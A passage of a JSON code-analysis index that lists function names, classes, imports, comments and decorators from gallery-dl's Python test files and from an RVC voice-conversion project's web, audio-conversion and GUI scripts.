          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "#  def tearDownModule():",
          "#      util.remove_file(dbpath)",
          "# value is still cached after 1 second",
          "# new value after 'maxage' seconds",
          "# value is still cached after 1 second",
          "# new value after 'maxage' seconds",
          "# initialize cache",
          "# check and clear the in-memory portion of said cache",
          "# fetch results from database",
          "# check in-memory cache updates"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@cache.memcache()",
          "@cache.memcache(maxage=10)",
          "@cache.cache()",
          "@cache.memcache(keyarg=2)",
          "@cache.memcache(keyarg=2, maxage=10)",
          "@cache.cache(keyarg=2, maxage=10)",
          "@cache.memcache(maxage=2)",
          "@cache.cache(maxage=2)",
          "@cache.memcache(keyarg=0)",
          "@cache.memcache(keyarg=0, maxage=10)",
          "@cache.cache(keyarg=0, maxage=10)",
          "@cache.memcache(keyarg=0)",
          "@cache.memcache(keyarg=0, maxage=10)",
          "@cache.cache(keyarg=0, maxage=10)",
          "@cache.cache(keyarg=0, maxage=10)"
        ]
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/test/test_config.py",
        "docstrings": [],
        "function_defs": [
          "def setUp(self):",
          "def tearDown(self):",
          "def test_get(self):",
          "def test_interpolate(self):",
          "def test_interpolate_common(self):",
          "def lookup():",
          "def test(path, value, expected=None):",
          "def test_accumulate(self):",
          "def test_set(self):",
          "def test_setdefault(self):",
          "def test_unset(self):",
          "def test_apply(self):",
          "def test_load(self):",
          "def test_default_config(self):",
          "def test_example_config(self):",
          "def _load(self, name):"
        ],
        "class_defs": [
          "class TestConfig(unittest.TestCase):",
          "class TestConfigFiles(unittest.TestCase):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import unittest",
          "import tempfile",
          "from gallery_dl import config, util  # noqa E402"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2015-2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation."
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 3,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/test/test_cookies.py",
        "docstrings": [],
        "function_defs": [
          "def setUpClass(cls):",
          "def tearDownClass(cls):",
          "def test_cookiefile(self):",
          "def test_invalid_cookiefile(self):",
          "def test_invalid_filename(self):",
          "def _test_warning(self, filename, exc):",
          "def setUp(self):",
          "def tearDown(self):",
          "def test_dict(self):",
          "def test_domain(self):",
          "def tearDown(self):",
          "def test_cookie_login(self):",
          "def test_check_cookies(self):",
          "def test_check_cookies_domain(self):",
          "def test_check_cookies_domain_sub(self):",
          "def test_check_cookies_expires(self):",
          "def _get_extractor(category):"
        ],
        "class_defs": [
          "class TestCookiejar(unittest.TestCase):",
          "class TestCookiedict(unittest.TestCase):",
          "class TestCookieLogin(unittest.TestCase):",
          "class TestCookieUtils(unittest.TestCase):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import unittest",
          "from unittest import mock",
          "import time",
          "import logging",
          "import datetime",
          "import tempfile",
          "from os.path import join",
          "from gallery_dl import config, extractor  # noqa E402"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2017-2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "# always returns False when checking for empty cookie list"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@classmethod",
          "@classmethod"
        ]
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/test/test_downloader.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def setUpClass(cls):",
          "def tearDownClass(cls):",
          "def setUp(self):",
          "def tearDown(self):",
          "def test_find(self):",
          "def test_cache(self, import_module):",
          "def test_cache_http(self, import_module):",
          "def test_cache_https(self, import_module):",
          "def setUp(self):",
          "def tearDown(self):",
          "def test_default_http(self):",
          "def test_config_http(self):",
          "def setUpClass(cls):",
          "def tearDownClass(cls):",
          "def _prepare_destination(cls, content=None, part=True, extension=None):",
          "def _run_test(self, url, input, output,",
          "def setUpClass(cls):",
          "def _run_test(self, ext, input, output,",
          "def tearDown(self):",
          "def test_http_download(self):",
          "def test_http_offset(self):",
          "def test_http_extension(self):",
          "def test_http_adjust_extension(self):",
          "def test_http_filesize_min(self):",
          "def test_http_filesize_max(self):",
          "def setUpClass(cls):",
          "def test_text_download(self):",
          "def test_text_offset(self):",
          "def test_text_empty(self):",
          "def do_GET(self):",
          "def generate_tests():",
          "def generate_test(idx, ext, content):",
          "def test(self):"
        ],
        "class_defs": [
          "class MockDownloaderModule(Mock):",
          "class FakeJob():",
          "class TestDownloaderModule(unittest.TestCase):",
          "class TestDownloaderConfig(unittest.TestCase):",
          "class TestDownloaderBase(unittest.TestCase):",
          "class TestHTTPDownloader(TestDownloaderBase):",
          "class TestTextDownloader(TestDownloaderBase):",
          "class HttpRequestHandler(http.server.BaseHTTPRequestHandler):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import unittest",
          "from unittest.mock import Mock, MagicMock, patch",
          "import re",
          "import logging",
          "import os.path",
          "import binascii",
          "import tempfile",
          "import threading",
          "import http.server",
          "from gallery_dl import downloader, extractor, output, config, path  # noqa E402",
          "from gallery_dl.downloader.http import MIME_TYPES, SIGNATURE_CHECKS # noqa E402"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2018-2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "# allow import of ytdl downloader module without youtube_dl installed",
          "# test successful download",
          "# test content",
          "# test filename extension",
          "# reverse mime types mapping"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 5,
        "decorators": [
          "@classmethod",
          "@classmethod",
          "@patch(\"builtins.__import__\")",
          "@patch(\"builtins.__import__\")",
          "@patch(\"builtins.__import__\")",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod"
        ]
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/test/test_extractor.py",
        "docstrings": [],
        "function_defs": [
          "def items(self):",
          "def setUp(self):",
          "def test_find(self):",
          "def test_add(self):",
          "def test_add_module(self):",
          "def test_from_url(self):",
          "def test_categories(self):",
          "def assertCategories(self, result):",
          "def test_init(self):\n\"\"\"Test for exceptions in Extractor.initialize() and .finalize()\"\"\"\ndef fail_request(*args, **kwargs):\nself.fail(\"called 'request() during initialization\")\n\nfor cls in extractor.extractors():\nif cls.category == \"ytdl\":\ncontinue\nextr = cls.from_url(cls.example)\nif not extr:",
          "def fail_request(*args, **kwargs):",
          "def test_init_ytdl(self):",
          "def test_docstrings(self):\n\"\"\"Ensure docstring uniqueness\"\"\"\nfor extr1 in extractor.extractors():\nfor extr2 in extractor.extractors():\nif extr1 != extr2 and extr1.__doc__ and extr2.__doc__:\nself.assertNotEqual(\nextr1.__doc__,\nextr2.__doc__,\nf\"{extr1} <-> {extr2}\",\n)",
          "def test_names(self):\n\"\"\"Ensure extractor classes are named CategorySubcategoryExtractor\"\"\"\ndef capitalize(c):\nif \"-\" in c:\nreturn string.capwords(c.replace(\"-\", \" \")).replace(\" \", \"\")\nreturn c.capitalize()\n\nfor extr in extractor.extractors():\nif extr.category not in (\"\", \"oauth\", \"ytdl\"):\nexpected = (f\"{capitalize(extr.category)}\"",
          "def capitalize(c):",
          "def test_wait_seconds(self):",
          "def test_wait_until(self):",
          "def test_wait_until_datetime(self):",
          "def _assert_isotime(self, output, until):",
          "def _isotime_to_seconds(self, isotime):",
          "def test_oauth1(self):",
          "def test_oauth2(self):",
          "def test_oauth2_mastodon(self):",
          "def test_oauth2_mastodon_unknown(self):"
        ],
        "class_defs": [
          "class FakeExtractor(Extractor):",
          "class TestExtractorModule(unittest.TestCase):",
          "class TestExtractorWait(unittest.TestCase):",
          "class TextExtractorOAuth(unittest.TestCase):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import unittest",
          "from unittest.mock import patch",
          "import time",
          "import string",
          "from datetime import datetime, timedelta",
          "from gallery_dl import extractor, util  # noqa E402",
          "from gallery_dl.extractor import mastodon  # noqa E402",
          "from gallery_dl.extractor.common import Extractor, Message  # noqa E402",
          "from gallery_dl.extractor.directlink import DirectlinkExtractor  # noqa E402",
          "from test import results"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2018-2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation."
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 9,
        "decorators": [
          "@unittest.skipIf(not results, \"no test data\")"
        ]
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/test/test_formatter.py",
        "docstrings": [],
        "function_defs": [
          "def tearDown(self):",
          "def test_conversions(self):",
          "def test_optional(self):",
          "def test_missing(self):",
          "def test_missing_custom_default(self):",
          "def test_fmt_func(self):",
          "def test_alternative(self):",
          "def test_indexing(self):",
          "def test_indexing_negative(self):",
          "def test_dict_access(self):",
          "def test_slice_str(self):",
          "def test_slice_bytes(self):",
          "def test_specifier_maxlen(self):",
          "def test_specifier_join(self):",
          "def test_specifier_replace(self):",
          "def test_specifier_datetime(self):",
          "def test_specifier_offset(self):",
          "def test_specifier_offset_local(self):",
          "def test_specifier_sort(self):",
          "def test_specifier_arithmetic(self):",
          "def test_specifier_conversions(self):",
          "def test_specifier_limit(self):",
          "def test_specifier_map(self):",
          "def test_chain_special(self):",
          "def test_separator(self):",
          "def test_globals_env(self):",
          "def test_globals_now(self):",
          "def test_globals_nul(self):",
          "def test_literals(self):",
          "def test_template(self):",
          "def test_expression(self):",
          "def test_fstring(self):",
          "def test_template_fstring(self):",
          "def test_jinja(self):",
          "def test_template_jinja(self):",
          "def test_template_jinja_opts(self):",
          "def datetime_format(value, format=\"%H:%M %d-%m-%y\"):",
          "def sanitize(value):",
          "def test_module(self):",
          "def gentext(kwdict):",
          "def lengths(kwdict):",
          "def noarg():",
          "def _run_test(self, format_string, result, default=None, fmt=format):"
        ],
        "class_defs": [
          "class TestFormatter(unittest.TestCase):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import time",
          "import unittest",
          "import datetime",
          "import tempfile",
          "from gallery_dl import formatter, text, util, config  # noqa E402",
          "import jinja2",
          "import re"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2021-2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "# multiple replacements",
          "# join-and-replace",
          "# join and slice",
          "# optional-and-maxlen",
          "# parse and format datetime",
          "# sort and join",
          "# map and join",
          "# empty (#4492)",
          "# special characters (dots, brackets, singlee quotes) (#5539)"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 6,
        "decorators": [
          "@unittest.skipIf(jinja2 is None, \"no jinja2\")",
          "@unittest.skipIf(jinja2 is None, \"no jinja2\")",
          "@unittest.skipIf(jinja2 is None, \"no jinja2\")"
        ]
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/test/test_job.py",
        "docstrings": [],
        "function_defs": [
          "def tearDown(self):",
          "def _capture_stdout(self, extr_or_job):",
          "def test_extractor_filter(self):",
          "def test_default(self):",
          "def test_default(self):",
          "def test_fallback(self):",
          "def test_parent(self):",
          "def test_child(self):",
          "def test_default(self):",
          "def test_custom(self):",
          "def test_base_category(self):",
          "def test_default(self):",
          "def test_exception(self):",
          "def test_private(self):",
          "def test_sleep(self):",
          "def test_ascii(self):",
          "def test_num_string(self):",
          "def __init__(self, match):",
          "def items(self):",
          "def items(self):",
          "def items(self):"
        ],
        "class_defs": [
          "class TestJob(unittest.TestCase):",
          "class TestDownloadJob(TestJob):",
          "class TestKeywordJob(TestJob):",
          "class TestUrlJob(TestJob):",
          "class TestInfoJob(TestJob):",
          "class TestDataJob(TestJob):",
          "class TestExtractor(Extractor):",
          "class TestExtractorParent(Extractor):",
          "class TestExtractorException(Extractor):",
          "class TestExtractorAlt(Extractor):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import unittest",
          "from unittest.mock import patch",
          "import io",
          "from gallery_dl import job, config, text  # noqa E402",
          "from gallery_dl.extractor.common import Extractor, Message  # noqa E402"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2021-2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation."
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/test/test_oauth.py",
        "docstrings": [],
        "function_defs": [
          "def test_concat(self):",
          "def test_nonce(self, size=16):",
          "def test_quote(self):",
          "def test_generate_signature(self):",
          "def test_dunder_call(self):",
          "def test_request_token(self):",
          "def test_access_token(self):",
          "def test_authenticated_call(self):",
          "def _oauth_request(self, endpoint, params=None,",
          "def __init__(self, url=\"\", method=\"GET\"):"
        ],
        "class_defs": [
          "class TestOAuthSession(unittest.TestCase):",
          "class MockRequest():"
        ],
        "imports": [
          "import os",
          "import sys",
          "import unittest",
          "from unittest.mock import patch",
          "from gallery_dl import oauth, text  # noqa E402"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2018-2023 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "# uniqueness",
          "# length",
          "# the test server at 'term.ie' is unreachable"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/test/test_output.py",
        "docstrings": [],
        "function_defs": [
          "def test_shorten_noop(self, f=output.shorten_string):",
          "def test_shorten(self, f=output.shorten_string):",
          "def test_shorten_separator(self, f=output.shorten_string):",
          "def test_shorten_eaw_noop(self, f=output.shorten_string_eaw):",
          "def test_shorten_eaw(self, f=output.shorten_string_eaw):",
          "def test_shorten_eaw_wide(self, f=output.shorten_string_eaw):",
          "def test_shorten_eaw_mix(self, f=output.shorten_string_eaw):",
          "def test_shorten_eaw_separator(self, f=output.shorten_string_eaw):",
          "def test_shorten_eaw_separator_wide(self, f=output.shorten_string_eaw):",
          "def test_shorten_eaw_separator_mix_(self, f=output.shorten_string_eaw):"
        ],
        "class_defs": [
          "class TestShorten(unittest.TestCase):",
          "class TestShortenEAW(unittest.TestCase):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import unittest",
          "from gallery_dl import output  # noqa E402"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2021 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation."
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/test/test_postprocessor.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, extr=extractor.find(\"generic:https://example.org/\")):",
          "def register_hooks(self, hooks, options=None):",
          "def setUp(self):",
          "def test_find(self):",
          "def test_cache(self, import_module):",
          "def setUpClass(cls):",
          "def tearDownClass(cls):",
          "def tearDown(self):",
          "def _create(self, options=None, data=None):",
          "def _trigger(self, events=None):",
          "def test_classify_default(self):",
          "def test_classify_noop(self):",
          "def test_classify_custom(self):",
          "def test_default(self):",
          "def test_command_string(self):",
          "def test_command_list(self):",
          "def test_command_many(self):",
          "def test_command_returncode(self):",
          "def test_async(self):",
          "def test_session_posix(self):",
          "def test_session_windows(self):",
          "def test_archive(self):",
          "def test_default(self):",
          "def test_custom_hashes(self):",
          "def test_custom_hashes_dict(self):",
          "def test_metadata_default(self):",
          "def test_metadata_json(self):",
          "def test_metadata_json_options(self):",
          "def test_metadata_tags(self):",
          "def test_metadata_tags_split_1(self):",
          "def test_metadata_tags_split_2(self):",
          "def test_metadata_tags_tagstring(self):",
          "def test_metadata_tags_dict(self):",
          "def test_metadata_tags_list_of_dict(self):",
          "def test_metadata_custom(self):",
          "def test(pp_info):",
          "def test_metadata_mode_print(self):",
          "def test_metadata_extfmt(self):",
          "def test_metadata_extfmt_2(self):",
          "def test_metadata_directory(self):",
          "def test_metadata_directory_2(self):",
          "def test_metadata_directory_format(self):",
          "def test_metadata_directory_empty(self):",
          "def test_metadata_basedirectory(self):",
          "def test_metadata_basedirectory_custom(self):",
          "def test_metadata_filename(self):",
          "def test_metadata_meta_path(self):",
          "def test_metadata_stdout(self):",
          "def test_metadata_modify(self):",
          "def test_metadata_delete(self):",
          "def test_metadata_option_skip(self):",
          "def test_metadata_option_skip_false(self):",
          "def test_metadata_option_include(self):",
          "def test_metadata_option_exclude(self):",
          "def test_archive(self):",
          "def _output(self, mock):",
          "def test_mtime_datetime(self):",
          "def test_mtime_timestamp(self):",
          "def test_mtime_none(self):",
          "def test_mtime_undefined(self):",
          "def test_mtime_key(self):",
          "def test_mtime_value(self):",
          "def test_module(self):",
          "def test_path(self):",
          "def test_eval(self):",
          "def test_eval_auto(self):",
          "def test_archive(self):",
          "def _write_module(self, path):",
          "def calc(kwdict):",
          "def _prepare(self, filename):",
          "def test_rename_from(self):",
          "def test_rename_to(self):",
          "def test_rename_from_to(self):",
          "def test_rename_noopt(self):",
          "def test_rename_skip(self):",
          "def test_zip_default(self):",
          "def test_zip_safe(self):",
          "def test_zip_options(self):",
          "def test_zip_write(self):",
          "def test_zip_write_mock(self):",
          "def side_effect(_, name):"
        ],
        "class_defs": [
          "class MockPostprocessorModule(Mock):",
          "class FakeJob():",
          "class TestPostprocessorModule(unittest.TestCase):",
          "class BasePostprocessorTest(unittest.TestCase):",
          "class ClassifyTest(BasePostprocessorTest):",
          "class DirectoryTest(BasePostprocessorTest):",
          "class ExecTest(BasePostprocessorTest):",
          "class HashTest(BasePostprocessorTest):",
          "class MetadataTest(BasePostprocessorTest):",
          "class MtimeTest(BasePostprocessorTest):",
          "class PythonTest(BasePostprocessorTest):",
          "class RenameTest(BasePostprocessorTest):",
          "class ZipTest(BasePostprocessorTest):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import unittest",
          "from unittest.mock import Mock, mock_open, patch, call",
          "import shutil",
          "import logging",
          "import zipfile",
          "import tempfile",
          "import collections",
          "from datetime import datetime",
          "from gallery_dl import extractor, output, path, util, exception  # noqa E402",
          "from gallery_dl import postprocessor, config, archive  # noqa E402",
          "from gallery_dl.postprocessor.common import PostProcessor  # noqa E402",
          "import subprocess"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2019-2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "# no new calls to import_module",
          "# default arguments",
          "# no errors for deleted/undefined fields",
          "# write dummy file with 3 different names",
          "# check file contents",
          "# write the last file a second time (will be skipped)",
          "# close file",
          "# reopen to check persistence",
          "# write 3 files",
          "# write the last file a second time (should be skipped)",
          "# close file"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": [
          "@patch(\"builtins.__import__\")",
          "@classmethod",
          "@classmethod",
          "@unittest.skipIf(util.WINDOWS, \"not POSIX\")",
          "@unittest.skipIf(not util.WINDOWS, \"not Windows\")"
        ]
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/test/test_results.py",
        "docstrings": [],
        "function_defs": [
          "def setUp(self):",
          "def tearDown(self):",
          "def setUpClass(cls):",
          "def tearDownClass(cls):",
          "def assertRange(self, value, range, msg=None):",
          "def assertLogEqual(self, expected, output):",
          "def _run_test(self, result):",
          "def _test_kwdict(self, kwdict, tests, parent=None):",
          "def _test_kwdict_value(self, value, test, path):",
          "def __init__(self, url, parent=None, content=False, format=True):",
          "def run(self):",
          "def handle_url(self, url, kwdict, fallback=None):",
          "def handle_directory(self, kwdict):",
          "def handle_metadata(self, kwdict):",
          "def handle_queue(self, url, kwdict):",
          "def _update_url(self, url):",
          "def _update_kwdict(self, kwdict, to_list=True):",
          "def _update_archive(self, kwdict):",
          "def _update_content(self, url, kwdict):",
          "def __init__(self, hashobj):",
          "def __enter__(self):",
          "def __exit__(self, exc_type, exc_value, traceback):",
          "def open(self, mode):",
          "def write(self, content):\n\"\"\"Update SHA1 hash\"\"\"\nself.size += len(content)\nself.hashobj.update(content)\n\ndef tell(self):\nreturn self.size\n\ndef part_size(self):\nreturn 0",
          "def tell(self):",
          "def part_size(self):",
          "def _apply_simple(self, key, fmt):",
          "def wrap(obj):",
          "def wrap(obj):",
          "def _apply(self, key, funcs, fmt):",
          "def wrap(obj):",
          "def wrap(obj):",
          "def setup_test_config():",
          "def load_test_config():",
          "def result_categories(result):",
          "def generate_tests():\n\"\"\"Dynamically generate extractor unittests\"\"\"\ndef _generate_method(result):\ndef test(self):\nsys.stdout.write(f\"\\n{result['#url']}\\n\")\nif \"#comment\" in result:\nsys.stdout.write(f\"# {result['#comment']}\\n\")\n\ntry:\nself._run_test(result)",
          "def _generate_method(result):",
          "def test(self):"
        ],
        "class_defs": [
          "class TestExtractorResults(unittest.TestCase):",
          "class ResultJob(job.DownloadJob):",
          "class TestPathfmt():",
          "class TestFormatter(formatter.StringFormatter):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import unittest",
          "import re",
          "import json",
          "import hashlib",
          "import datetime",
          "import collections",
          "from gallery_dl import \\",
          "from test import results"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2015-2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "# temporary issues, etc.",
          "# auth explicitly disabled",
          "# test '_extractor' entries",
          "# test 'extension' entries",
          "# test extraction results",
          "# enable selective testing for direct calls",
          "# add 'test_...' methods"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 20,
        "decorators": [
          "@classmethod",
          "@classmethod"
        ]
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Users/davidquinton/Projects/SAM/voice/rvc",
    "name": "rvc",
    "languages": [
      "Python",
      "Go"
    ],
    "python_patterns": [
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/web.py",
        "docstrings": [],
        "function_defs": [
          "def forward_dml(ctx, x, scale):",
          "def lookup_names(weight_root):",
          "def lookup_indices(index_root):",
          "def change_choices():",
          "def clean():",
          "def export_onnx(ModelPath, ExportedPath):",
          "def if_done(done, p):",
          "def if_done_multi(done, ps):",
          "def preprocess_dataset(trainset_dir, exp_dir, sr, n_p):",
          "def extract_f0_feature(n_p, f0method, if_f0, exp_dir, version19):",
          "def get_pretrained_models(path_str, f0_str, sr2):",
          "def change_sr2(sr2, if_f0_3, version19):",
          "def change_version19(sr2, if_f0_3, version19):",
          "def change_f0(if_f0_3, sr2, version19):  # f0method8,pretrained_G14,pretrained_D15",
          "def click_train(",
          "def train_index(exp_dir1, version19):",
          "def train1key(",
          "def get_info_str(strr):",
          "def change_info_(ckpt_path):",
          "def cleanup(signum, frame):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "from dotenv import load_dotenv",
          "from infer.modules.vc import VC, show_info, hash_similarity",
          "from infer.modules.uvr5.modules import uvr",
          "from infer.lib.train.process_ckpt import (",
          "from i18n.i18n import I18nAuto",
          "from configs import Config",
          "from sklearn.cluster import MiniBatchKMeans",
          "import torch, platform",
          "import numpy as np",
          "import gradio as gr",
          "import faiss",
          "import pathlib",
          "import json",
          "from time import sleep",
          "from subprocess import Popen",
          "from random import shuffle",
          "import warnings",
          "import traceback",
          "import threading",
          "import shutil",
          "import logging",
          "from infer.lib.rvcmd import check_all_assets, download_all_assets",
          "import fairseq",
          "from rvc.onnx import export_onnx as eo",
          "import signal"
        ],
        "comments": [
          "# \u5224\u65ad\u662f\u5426\u6709\u80fd\u7528\u6765\u8bad\u7ec3\u548c\u52a0\u901f\u63a8\u7406\u7684N\u5361",
          "# A10#A100#V100#A40#P40#M40#K80#A4500",
          "# poll==None\u4ee3\u8868\u8fdb\u7a0b\u672a\u7ed3\u675f",
          "# \u53ea\u8981\u6709\u4e00\u4e2a\u8fdb\u7a0b\u672a\u7ed3\u675f\u90fd\u4e0d\u505c",
          "# , stdin=PIPE, stdout=PIPE,stderr=PIPE,cwd=now_dir",
          "# \u715e\u7b14gr, popen read\u90fd\u975e\u5f97\u5168\u8dd1\u5b8c\u4e86\u518d\u4e00\u6b21\u6027\u8bfb\u53d6, \u4e0d\u7528gr\u5c31\u6b63\u5e38\u8bfb\u4e00\u53e5\u8f93\u51fa\u4e00\u53e5;\u53ea\u80fd\u989d\u5916\u5f04\u51fa\u4e00\u4e2a\u6587\u672c\u6d41\u5b9a\u65f6\u8bfb",
          "# but2.click(extract_f0,[gpus6,np7,f0method8,if_f0_3,trainset_dir4],[info2])",
          "# \u5bf9\u4e0d\u540cpart\u5206\u522b\u5f00\u591a\u8fdb\u7a0b",
          "# \u715e\u7b14gr, popen read\u90fd\u975e\u5f97\u5168\u8dd1\u5b8c\u4e86\u518d\u4e00\u6b21\u6027\u8bfb\u53d6, \u4e0d\u7528gr\u5c31\u6b63\u5e38\u8bfb\u4e00\u53e5\u8f93\u51fa\u4e00\u53e5;\u53ea\u80fd\u989d\u5916\u5f04\u51fa\u4e00\u4e2a\u6587\u672c\u6d41\u5b9a\u65f6\u8bfb",
          "# but3.click(click_train,[exp_dir1,sr2,if_f0_3,save_epoch10,total_epoch11,batch_size12,if_save_latest13,pretrained_G14,pretrained_D15,gpus16])",
          "# \u751f\u6210filelist",
          "# but4.click(train_index, [exp_dir1], info3)",
          "# exp_dir = \"%s/logs/%s\" % (now_dir, exp_dir1)",
          "# index = faiss.index_factory(256if version19==\"v1\"else 768, \"IVF%s,PQ128x4fs,RFlat\"%n_ivf)",
          "# faiss.write_index(index, '%s/added_IVF%s_Flat_FastScan_%s.index'%(exp_dir,n_ivf,version19))",
          "# infos.append(\"\u6210\u529f\u6784\u5efa\u7d22\u5f15\uff0cadded_IVF%s_Flat_FastScan_%s.index\"%(n_ivf,version19))",
          "# but5.click(train1key, [exp_dir1, sr2, if_f0_3, trainset_dir4, spk_id5, gpus6, np7, f0method8, save_epoch10, total_epoch11, batch_size12, if_save_latest13, pretrained_G14, pretrained_D15, gpus16, if_cache_gpu17], info3)",
          "# step1:Process data",
          "# step2a:\u63d0\u53d6\u97f3\u9ad8",
          "# step3a:Train model",
          "# step3b:\u8bad\u7ec3\u7d22\u5f15",
          "#                    ckpt_path2.change(change_info_,[ckpt_path2],[sr__,if_f0__])",
          "# file_big_npy1,",
          "# file_big_npy2 = gr.Textbox(",
          "#     label=i18n(\"\u7279\u5f81\u6587\u4ef6\u8def\u5f84\"),",
          "#     value=\"E:\\\\codes\\\\py39\\\\vits_vc_gpu_train\\\\logs\\\\mi-test-1key\\\\total_fea.npy\",",
          "#     interactive=True,",
          "# )",
          "# file_big_npy2,"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 9,
        "error_handling": 6,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/convert_audio.py",
        "docstrings": [],
        "function_defs": [
          "def convert_audio(input_path, output_path):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "from pydub import AudioSegment",
          "import sys"
        ],
        "comments": [
          "# Load the audio file",
          "# Convert to WAV format with specific parameters",
          "# Export as WAV"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/gui.py",
        "docstrings": [],
        "function_defs": [
          "def printt(strr, *args):",
          "def phase_vocoder(a, b, fade_out, fade_in):",
          "def __init__(self, inp_q, opt_q):",
          "def run(self):",
          "def __init__(self) -> None:",
          "def __init__(self) -> None:",
          "def check_assets(self):",
          "def load(self):",
          "def launcher(self):",
          "def event_handler(self):",
          "def set_values(self, values):",
          "def start_vc(self):",
          "def start_stream(self):",
          "def stop_stream(self):",
          "def audio_callback(",
          "def update_devices(self, hostapi_name=None):\n\"\"\"\u83b7\u53d6\u8bbe\u5907\u5217\u8868\"\"\"\nglobal flag_vc\nflag_vc = False\nsd._terminate()\nsd._initialize()\ndevices = sd.query_devices()\nhostapis = sd.query_hostapis()\nfor hostapi in hostapis:\nfor device_idx in hostapi[\"devices\"]:",
